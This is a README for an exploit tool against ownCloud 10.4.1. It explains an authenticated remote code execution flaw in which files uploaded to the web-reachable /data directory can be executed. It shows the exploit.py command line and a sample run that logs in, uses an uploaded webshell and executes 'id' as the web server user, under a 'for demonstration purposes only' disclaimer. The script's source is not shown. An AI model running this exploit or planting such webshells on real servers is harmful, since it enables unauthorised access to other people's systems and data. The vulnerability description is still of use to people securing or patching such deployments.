### ownCloud-Authenticated-RCE-By-Default-Path.
Exploit to remote code execution in ownCloud v.10.4.1 based in bad permissions to /data where users' files are stored by default. 

The error is based in the access to /data, where there are folders for each user, for example, you can enter example.com/data/user and there you can find the trash bin, the files, etc of this user. The several risk is in the access of your own files because you can execute code of your uploaded files.

# For demonstration purposes only! Use it at your own risk.

The use of this exploit is:

```
./exploit.py -t http://example.com/owncloud -u user -p password -c id
```

Example:
```
daniel@debian:~/Owncloud$ ./exploit.py -t http://192.168.1.90/owncloud -u daniel -p daniel -c id
[?] Logging in...
[+] Logged in. Checking if a webshell is uploaded...
[+] Webshell already uploaded
[?] Executing the code...

uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Command successfully executed

```
